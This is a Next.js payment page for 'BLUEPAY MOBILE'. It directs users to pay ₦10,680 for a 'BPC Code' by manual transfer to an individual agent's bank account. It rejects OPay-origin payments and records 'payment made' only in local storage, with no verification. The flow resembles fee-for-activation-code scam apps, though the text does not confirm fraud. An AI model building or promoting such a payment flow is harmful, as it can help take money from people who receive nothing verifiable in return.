"use client"

import type React from "react"
import { useEffect, useState } from "react"
import { ArrowLeft, Check, Copy, FileText, Info, Upload, X, AlertTriangle } from "lucide-react"
import Image from "next/image"
import { useRouter } from "next/navigation"

const accountNumber = "6711230988"
const allowedTypes = ["image/png", "image/jpeg", "application/pdf"]

export default function PaymentPage() {
  const router = useRouter()
  const [user, setUser] = useState({ name: "", email: "", amount: "₦10,680.00" })
  const [acknowledged, setAcknowledged] = useState(false)
  const [receipt, setReceipt] = useState<File | null>(null)
  const [copied, setCopied] = useState(false)
  const [error, setError] = useState("")
  const [submitting, setSubmitting] = useState(false)

  useEffect(() => {
    const profile = JSON.parse(localStorage.getItem("userData") || "{}")
    const payment = JSON.parse(localStorage.getItem("paymentData") || "{}")
    const storedAttempt = payment.attemptId ? JSON.parse(localStorage.getItem(`bluepayPaymentAttempt:${payment.attemptId}`) || "null") : null
    setUser({ name: storedAttempt?.name || payment.userName || profile.fullName || "", email: storedAttempt?.email || payment.userEmail || profile.email || "", amount: formatAmount(storedAttempt?.amount || payment.amount || "10680") })
  }, [])

  function formatAmount(value: string | number) {
    const numeric = Number(String(value).replace(/[^0-9.]/g, ""))
    return Number.isFinite(numeric) ? `₦${numeric.toLocaleString("en-NG", { minimumFractionDigits: 2 })}` : "₦0.00"
  }

  function chooseReceipt(event: React.ChangeEvent<HTMLInputElement>) {
    const file = event.target.files?.[0]
    if (!file) return
    if (!allowedTypes.includes(file.type)) { setError("Choose a PNG, JPG, JPEG, or PDF receipt."); return }
    if (file.size > 8 * 1024 * 1024) { setError("Receipt must be smaller than 8 MB."); return }
    setError(""); setReceipt(file)
  }

  async function copyAccount() {
    await navigator.clipboard?.writeText(accountNumber)
    setCopied(true); window.setTimeout(() => setCopied(false), 1800)
  }

  function submitPayment() {
    if (submitting) return
    setSubmitting(true)
    const id = crypto.randomUUID()
    const attempt = { id, reference: `BPM-PAY-${id.slice(0, 8).toUpperCase()}`, createdAt: new Date().toISOString(), status: "awaiting_review", name: user.name, email: user.email, amount: user.amount, receiptName: receipt?.name || null }
    const existing = JSON.parse(localStorage.getItem("paymentAttempt") || "null")
    const savedAttempt = { ...(existing || {}), ...attempt, id: existing?.id || id, userId: existing?.userId || JSON.parse(localStorage.getItem("paymentData") || "{}").userId }
    localStorage.setItem(`bluepayPaymentAttempt:${savedAttempt.id}`, JSON.stringify(savedAttempt))
    localStorage.setItem("paymentAttempt", JSON.stringify(savedAttempt))
    localStorage.setItem("paymentData", JSON.stringify({ userId: savedAttempt.userId, userName: user.name, userEmail: user.email, amount: user.amount, attemptId: savedAttempt.id }))
    router.push(`/payment-confirmation?attemptId=${savedAttempt.id}`)
  }

  return <main className="min-h-screen bg-[#f6f8fc] text-slate-950"><header className="bg-[#0000ff] px-4 pb-4 pt-10 text-white"><div className="mx-auto flex max-w-lg items-center gap-3"><button onClick={() => router.back()} aria-label="Go back" className="rounded-full p-2 hover:bg-white/10"><ArrowLeft size={19}/></button><div><p className="text-[11px] text-blue-100">BLUEPAY MOBILE</p><h1 className="text-base font-semibold">Payment details</h1></div></div></header><section className="mx-auto max-w-lg space-y-3 px-4 py-4"><div className="flex items-center justify-between text-xs font-semibold text-slate-500"><span className="text-[#0000ff]">01 Payment details</span><span>02 Review</span><span>03 Status</span></div>{!acknowledged ? <div className="rounded-2xl border border-amber-200 bg-amber-50 p-4"><div className="flex gap-3"><Image src="/images/opay-logo.png" alt="OPay" width={40} height={40} className="h-10 w-10 rounded-xl bg-white object-contain p-1"/><div><div className="flex items-center gap-2 font-semibold text-amber-950"><AlertTriangle size={17}/> Important Payment Notice</div><p className="mt-2 text-xs leading-5 text-amber-900">We are <strong>NOT accepting payments from OPay accounts.</strong> Please use another bank account, such as GTBank, Access Bank, First Bank, UBA, Zenith Bank, or another traditional bank. Payments sent from OPay accounts cannot be verified through the current payment process.</p><p className="mt-2 text-xs leading-5 text-amber-900"><strong>Tip:</strong> Where appropriate, use your usual withdrawal bank account and keep your payment receipt.</p></div></div><button onClick={() => setAcknowledged(true)} className="mt-3 flex h-10 w-full items-center justify-center gap-2 rounded-xl bg-[#0000ff] text-sm font-semibold text-white">I WON&apos;T USE OPAY <Check size={16}/></button></div> : <><div className="rounded-2xl border border-slate-200 bg-white p-4 shadow-sm"><div className="flex items-center justify-between"><div><p className="text-xs text-slate-500">BPC Code purchase</p><p className="mt-1 text-2xl font-bold">{user.amount}</p></div><Info className="text-[#0000ff]" size={20}/></div></div><div className="rounded-2xl border border-slate-200 bg-white p-4 shadow-sm"><h2 className="font-semibold">Account details</h2><div className="mt-3 space-y-3 text-sm"><Row label="Bank" value="MONIEPOINT MFB"/><Row label="Account name" value="MOD... CH... AGB (BLUEPAY2026 Agent)"/><div className="flex items-center justify-between gap-3 border-t border-slate-100 pt-3"><span className="text-slate-500">Account number</span><span className="flex items-center gap-2 font-bold tracking-wider">{accountNumber}<button onClick={copyAccount} aria-label="Copy account number" className="rounded-lg p-1.5 text-[#0000ff] hover:bg-blue-50"><Copy size={16}/></button></span></div>{copied && <p className="text-right text-xs text-emerald-600">Account number copied</p>}</div><p className="mt-3 text-xs text-slate-500">Do not claim these account details are verified through an API.</p></div><div className="rounded-2xl border border-slate-200 bg-white p-4 shadow-sm"><div className="flex items-center justify-between"><div><h2 className="font-semibold">Payment receipt</h2><p className="mt-1 text-xs text-slate-500">Upload your payment receipt for easier payment checking.</p></div><FileText className="text-[#0000ff]" size={20}/></div>{receipt ? <div className="mt-3 flex items-center justify-between rounded-xl bg-slate-50 p-3 text-xs"><span className="flex min-w-0 items-center gap-2 truncate"><FileText size={16} className="shrink-0 text-emerald-600"/>{receipt.name}</span><button onClick={() => setReceipt(null)} aria-label="Remove receipt" className="p-1 text-red-500"><X size={16}/></button></div> : <label htmlFor="payment-receipt" className="mt-3 flex cursor-pointer items-center justify-center gap-2 rounded-xl border border-dashed border-slate-300 py-4 text-xs font-semibold text-slate-600"><Upload size={17}/> Click to upload receipt<input id="payment-receipt" type="file" accept=".png,.jpg,.jpeg,.pdf" onChange={chooseReceipt} className="sr-only"/></label>}<p className="mt-2 text-[11px] text-slate-400">Upload Payment Receipt (Optional) · PNG, JPG, JPEG, PDF</p></div>{error && <p role="alert" className="rounded-xl bg-red-50 px-3 py-2 text-xs text-red-700">{error}</p>}<button onClick={submitPayment} disabled={submitting} className="h-11 w-full rounded-xl bg-[#0000ff] text-sm font-semibold text-white disabled:opacity-50">{submitting ? "Saving payment attempt..." : "I&apos;VE MADE PAYMENT"}</button><p className="text-center text-[11px] text-slate-500">Submitting records an internal attempt for review. It does not verify a bank payment.</p></>}</section></main>
}
function Row({ label, value }: { label: string; value: string }) { return <div className="flex items-start justify-between gap-4"><span className="text-slate-500">{label}</span><span className="max-w-[65%] text-right font-semibold">{value}</span></div> }
